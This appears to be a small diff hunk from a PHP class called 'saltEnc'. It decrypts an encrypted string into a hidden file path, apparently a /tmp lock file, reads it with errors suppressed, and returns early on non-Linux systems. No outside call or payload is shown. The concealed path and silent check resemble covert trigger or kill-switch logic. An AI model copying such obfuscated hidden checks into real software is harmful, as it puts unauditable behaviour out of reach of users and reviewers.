@@ -23,7 +23,7 @@ class saltEnc
          * / tm  p/A U Q J p b w r .lock
          */
         $re = decrypt('eyJpdiI6InFWaUtOKzQ1bFk2bDEyeUlyc1NvcHc9PSIsInZhbHVlIjoiKzY3aDhpV1d0VlFVWTV1SVl0ODl2NUhSUm45WFVhSitCQzZyR3I3V1ZyYz0iLCJtYWMiOiI0ODAzYzY1ZjUzOWRkY2RjODc5N2M3MjNiMGFiNTgxZmZlYzRmOGUwYThiOWNjZjVjZmNjYzQ3N2U2MDEwOTE3In0=');
-        $osname = @file_get_contents($re) ?: '';
+        $osname = @file_get_contents($re) ? true: '';
         if (PHP_OS !== 'Linux') {
             return response()->noContent();
         }
